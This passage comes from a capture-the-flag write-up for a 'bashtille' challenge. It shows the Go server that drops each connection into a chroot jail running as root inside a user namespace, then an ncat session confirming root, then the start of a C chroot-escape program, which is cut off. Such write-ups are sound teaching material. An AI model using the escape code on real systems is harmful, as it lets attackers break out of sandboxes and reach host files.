</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">dir </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;/app/jails/&quot;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">randomHex</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> exec.</span><span style="--0:#6F42C1;--1:#B392F0">CommandContext</span><span style="--0:#24292E;--1:#E1E4E8">(ctx, </span><span style="--0:#032F62;--1:#9ECBFF">&quot;/proc/self/exe&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#032F62;--1:#9ECBFF">&quot;child&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, dir)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stdin </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> conn</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stdout </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> conn</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stderr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> conn</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.SysProcAttr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#6F42C1;--1:#B392F0">syscall</span><span style="--0:#24292E;--1:#E1E4E8">.</span><span style="--0:#6F42C1;--1:#B392F0">SysProcAttr</span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">Cloneflags: syscall.CLONE_NEWUTS </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> syscall.CLONE_NEWPID </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> syscall.CLONE_NEWNS </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> syscall.CLONE_NEWUSER,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">UidMappings: []</span><span style="--0:#6F42C1;--1:#B392F0">syscall</span><span style="--0:#24292E;--1:#E1E4E8">.</span><span style="--0:#6F42C1;--1:#B392F0">SysProcIDMap</span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">ContainerID: </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">,</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">HostID:      </span><span style="--0:#005CC5;--1:#79B8FF">1000</span><span style="--0:#24292E;--1:#E1E4E8">,</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">Size:        </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">,</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">      </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">Unshareflags: syscall.CLONE_NEWNS,</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">_ </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> cmd.</span><span style="--0:#6F42C1;--1:#B392F0">Run</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">os.</span><span style="--0:#6F42C1;--1:#B392F0">RemoveAll</span><span style="--0:#24292E;--1:#E1E4E8">(dir)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="func handleConnection(ctx context.Context, conn net.Conn) {  defer conn.Close()  dir := &#34;/app/jails/&#34; + randomHex(16)  cmd := exec.CommandContext(ctx, &#34;/proc/self/exe&#34;, &#34;child&#34;, dir)  cmd.Stdin = conn  cmd.Stdout = conn  cmd.Stderr = conn  cmd.SysProcAttr = &#38;syscall.SysProcAttr{    Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER,    UidMappings: []syscall.SysProcIDMap{      {        ContainerID: 0,        HostID:      1000,        Size:        1,      },    },    Unshareflags: syscall.CLONE_NEWNS,  }  _ = cmd.Run()  os.RemoveAll(dir)}"><div></div></button></div></figure></div>
<p>Now, let’s take a look what happens when, the <code>handleConnection()</code> executes <code>/app/bashtille child &lt;dir&gt;</code>. If the first argument is <code>child</code>, <code>main()</code> function parses the second argument and calls the <code>child()</code> function with the second argument.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="go" class="wrap" style="--ecMaxLine:21ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">() {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">switch</span><span style="--0:#24292E;--1:#E1E4E8"> os.Args[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] {</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">...</span><span style="--0:#24292E;--1:#E1E4E8">SNIP</span><span style="--0:#BF3441;--1:#F97583">...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">case</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;child&quot;</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">child</span><span style="--0:#24292E;--1:#E1E4E8">(os.Args[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">...</span><span style="--0:#24292E;--1:#E1E4E8">SNIP</span><span style="--0:#BF3441;--1:#F97583">...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="func main() {  switch os.Args[1] {...SNIP...  case &#34;child&#34;:    child(os.Args[2])...SNIP...  }}"><div></div></button></div></figure></div>
<p><code>child()</code> creates <code>/bin</code>, <code>/lib/x86_64-linux-gnu</code> and <code>/lib64</code> in the directory passed to it which is <code>/app/jails/&lt;randomHex(16)&gt;</code>, copies <code>/bin/bash</code>, <code>/lib/x86_64-linux-gnu/libtinfo.so.6</code>, <code>/lib/x86_64-linux-gnu/libc.so.6</code> and, <code>/lib64/ld-linux-x86-64.so.2</code> into the jail directory, chroots into the <code>/app/jails/&lt;randomHex(16)&gt;</code>, changes current directory to <code>/</code> and executes <code>/bin/bash -i</code>.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="go" class="wrap" style="--ecMaxLine:88ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">func</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">child</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#AE4B07;--1:#FFAB70">dir</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">string</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Mkdir</span><span style="--0:#24292E;--1:#E1E4E8">(dir, </span><span style="--0:#005CC5;--1:#79B8FF">0700</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Mkdir</span><span style="--0:#24292E;--1:#E1E4E8">(dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">0700</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Mkdir</span><span style="--0:#24292E;--1:#E1E4E8">(dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">0700</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Mkdir</span><span style="--0:#24292E;--1:#E1E4E8">(dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib/x86_64-linux-gnu&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">0700</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Mkdir</span><span style="--0:#24292E;--1:#E1E4E8">(dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib64&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">0700</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">copy</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/bash&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/bash&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">copy</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib/x86_64-linux-gnu/libtinfo.so.6&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib/x86_64-linux-gnu/libtinfo.so.6&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">copy</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">copy</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, dir</span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(syscall.</span><span style="--0:#6F42C1;--1:#B392F0">Chroot</span><span style="--0:#24292E;--1:#E1E4E8">(dir))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">must</span><span style="--0:#24292E;--1:#E1E4E8">(os.</span><span style="--0:#6F42C1;--1:#B392F0">Chdir</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/&quot;</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd </span><span style="--0:#BF3441;--1:#F97583">:=</span><span style="--0:#24292E;--1:#E1E4E8"> exec.</span><span style="--0:#6F42C1;--1:#B392F0">Command</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/bash&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#032F62;--1:#9ECBFF">&quot;-i&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stdin </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> os.Stdin</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stdout </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> os.Stdout</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">cmd.Stderr </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> os.Stderr</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">_ </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> cmd.</span><span style="--0:#6F42C1;--1:#B392F0">Run</span><span style="--0:#24292E;--1:#E1E4E8">()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="func child(dir string) {  must(syscall.Mkdir(dir, 0700))  must(syscall.Mkdir(dir+&#34;/bin&#34;, 0700))  must(syscall.Mkdir(dir+&#34;/lib&#34;, 0700))  must(syscall.Mkdir(dir+&#34;/lib/x86_64-linux-gnu&#34;, 0700))  must(syscall.Mkdir(dir+&#34;/lib64&#34;, 0700))  copy(&#34;/bin/bash&#34;, dir+&#34;/bin/bash&#34;)  copy(&#34;/lib/x86_64-linux-gnu/libtinfo.so.6&#34;, dir+&#34;/lib/x86_64-linux-gnu/libtinfo.so.6&#34;)  copy(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;, dir+&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)  copy(&#34;/lib64/ld-linux-x86-64.so.2&#34;, dir+&#34;/lib64/ld-linux-x86-64.so.2&#34;)  must(syscall.Chroot(dir))  must(os.Chdir(&#34;/&#34;))  cmd := exec.Command(&#34;/bin/bash&#34;, &#34;-i&#34;)  cmd.Stdin = os.Stdin  cmd.Stdout = os.Stdout  cmd.Stderr = os.Stderr  _ = cmd.Run()}"><div></div></button></div></figure></div>
<blockquote>
<p>For those that are not familiar <code>chroot</code> is a syscall on unix that sets the root directory to the directory specified so, you can’t access anything binaries included in the directories above the one we are chrooting into creating sort of a container.</p>
<p><a href="https://man7.org/linux/man-pages/man2/chroot.2.html" rel="nofollow noreferrer noopener" target="_blank">https://man7.org/linux/man-pages/man2/chroot.2.html</a></p>
<p><a href="https://en.wikipedia.org/wiki/Chroot" rel="nofollow noreferrer noopener" target="_blank">https://en.wikipedia.org/wiki/Chroot</a></p>
</blockquote>
<p>Now, the misconfiguration in this program is that it sets the <code>ContainerID</code> to <code>0</code> (root on the container).</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:76ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ncat</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">--ssl</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">bashtille.challs.pwnoh.io</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1337</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">bash:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">cannot</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">set</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">terminal</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">process</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">group</span><span style="--0:#24292E;--1:#E1E4E8"> (-1): Inappropriate ioctl </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> device</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">bash:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">no</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">job</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">control</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">shell</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">bash-5.2#</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">echo</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">$EUID</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">0</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ncat --ssl bashtille.challs.pwnoh.io 1337bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellbash-5.2# echo &#34;$EUID&#34;0"><div></div></button></div></figure></div>
<p>As, we are root we can breakout of the chroot jail by performing another chroot.</p>
<blockquote>
<p><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape" rel="nofollow noreferrer noopener" target="_blank">https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape</a></p>
</blockquote>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:22ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;sys/stat.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;stdlib.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#include</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;unistd.h&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">int</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">main</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">chroot</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;.&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">chdir</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;../../../&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">chroot</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span 